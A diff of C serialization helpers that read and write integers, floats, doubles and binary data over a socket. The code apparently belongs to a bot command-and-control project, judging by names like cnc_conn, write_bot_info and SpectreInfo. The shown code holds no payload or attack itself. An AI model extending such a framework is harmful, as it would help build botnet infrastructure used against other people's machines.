@@ -6,36 +6,52 @@
 #include <debug.h>
 
 
+bool write_int16(cnc_conn *c, int16_t val) {
+    return WRITE_SOCKET(c->sock, (BYTES * ) & val, sizeof(val)) == sizeof(val);
+}
+
+bool read_int16(cnc_conn *c, int16_t *val) {
+    return READ_SOCKET(c->sock, (BYTES *) val, sizeof(*val)) == sizeof(*val);
+}
+
 bool write_int32(cnc_conn *c, int32_t val) {
-    return WRITE_SOCKET(c->sock, (char *) &val, sizeof(val)) == sizeof(val);
+    return WRITE_SOCKET(c->sock, (BYTES * ) & val, sizeof(val)) == sizeof(val);
 }
 
 bool read_int32(cnc_conn *c, int32_t *val) {
-    return READ_SOCKET(c->sock, (char *) val, sizeof(*val)) == sizeof(*val);
+    return READ_SOCKET(c->sock, (BYTES *) val, sizeof(*val)) == sizeof(*val);
 }
 
 bool write_int64(cnc_conn *c, int64_t val) {
-    return WRITE_SOCKET(c->sock, (char *) &val, sizeof(val)) == sizeof(val);
+    return WRITE_SOCKET(c->sock, (BYTES * ) & val, sizeof(val)) == sizeof(val);
 }
 
 bool read_int64(cnc_conn *c, int64_t *val) {
-    return READ_SOCKET(c->sock, (char *) val, sizeof(*val)) == sizeof(*val);
+    return READ_SOCKET(c->sock, (BYTES *) val, sizeof(*val)) == sizeof(*val);
 }
 
 bool read_bool(cnc_conn *c, bool *val) {
-    return READ_SOCKET(c->sock, (char *) val, sizeof(*val)) == sizeof(*val);
+    return READ_SOCKET(c->sock, (BYTES *) val, sizeof(*val)) == sizeof(*val);
 }
 
 bool write_bool(cnc_conn *c, bool val) {
-    return WRITE_SOCKET(c->sock, (char *) &val, sizeof(val)) == sizeof(val);
+    return WRITE_SOCKET(c->sock, (BYTES * ) & val, sizeof(val)) == sizeof(val);
 }
 
 bool read_float(cnc_conn *c, float *val) {
-    return READ_SOCKET(c->sock, (char *) val, sizeof(*val)) == sizeof(*val);
+    return READ_SOCKET(c->sock, (BYTES *) val, sizeof(*val)) == sizeof(*val);
 }
 
 bool write_float(cnc_conn *c, float val) {
-    return WRITE_SOCKET(c->sock, (char *) &val, sizeof(val)) == sizeof(val);
+    return WRITE_SOCKET(c->sock, (BYTES * ) & val, sizeof(val)) == sizeof(val);
+}
+
+bool read_double(cnc_conn *c, double *val) {
+    return READ_SOCKET(c->sock, (BYTES *) val, sizeof(*val)) == sizeof(*val);
+}
+
+bool write_double(cnc_conn *c, double val) {
+    return WRITE_SOCKET(c->sock, (BYTES * ) & val, sizeof(val)) == sizeof(val);
 }
 
 bool write_string(cnc_conn *c, char *val) {
@@ -128,10 +144,6 @@ StringList *read_string_list(cnc_conn *c) {
 }
 
 
-bool write_double(cnc_conn *conn, double val) {
-    return WRITE_SOCKET(conn->sock, (char *) &val, sizeof(val)) == sizeof(val);
-}
-
 bool read_binary(cnc_conn *c, BYTES **buf) {
     int32_t len;
 
@@ -144,7 +156,7 @@ bool read_binary(cnc_conn *c, BYTES **buf) {
     *buf = malloc(len);
     if (*buf == NULL) return false;
 
-    if (READ_SOCKET(c->sock, (char*) *buf, len) != (size_t) len) {
+    if (READ_SOCKET(c->sock, (char *) *buf, len) != (size_t) len) {
         free(*buf);
         return false;
     }
@@ -177,6 +189,8 @@ bool write_bot_info(cnc_conn *conn, SpectreInfo *info) {
 
 char *get_type_name(int type) {
     switch (type) {
+        case ArgTypeInt16:
+            return "Int16";
         case ArgTypeInt32:
             return "Int32";
         case ArgTypeString:
@@ -191,6 +205,8 @@ char *get_type_name(int type) {
             return "StringMap";
         case ArgTypeFloat:
             return "Float";
+        case ArgTypeDouble:
+            return "Double";
         case ArgTypeInt64:
             return "Int64";
         case ArgTypeBotInfo:
